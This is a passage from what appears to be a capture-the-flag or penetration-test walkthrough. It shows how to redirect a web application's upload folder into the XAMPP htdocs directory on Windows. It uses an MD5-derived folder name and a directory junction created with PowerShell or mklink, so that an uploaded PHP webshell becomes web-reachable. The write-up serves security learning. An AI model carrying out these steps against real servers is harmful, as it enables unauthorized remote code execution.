Now that we've confirmed the ownership and permissions of the upload directory, we can look at whether the upload path can be redirected to the Apache htdocs directory. Windows supports directory junctions, which allow one directory to point to another.

Since the application writes uploaded files directly to the generated directory, we can replace that directory with a junction pointing to C:\xampp\htdocs. We can test this by generating a new directory name and creating a junction at that path.

The directory name is derived from firstname + lastname + email, so we can choose arbitrary values to generate a new directory name:
Firstname: foo
Lastname: bar
Email: foo@bar.com
```shell
echo -n 'foobarfoo@bar.com' | md5sum
beefb40925db9ee54560bb7f90d37d0d  -
```
Creating the junction:
```powershell
PS C:\windows\tasks\uploads> New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d" -Target "C:\xampp\htdocs"
```
or via CMD:
```cmd
mklink /J C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d C:\xampp\htdocs
```

We can now upload a PHP webshell through the application. Because the upload path resolves through our junction, the file is written to C:\xampp\htdocs and becomes accessible through the web server.
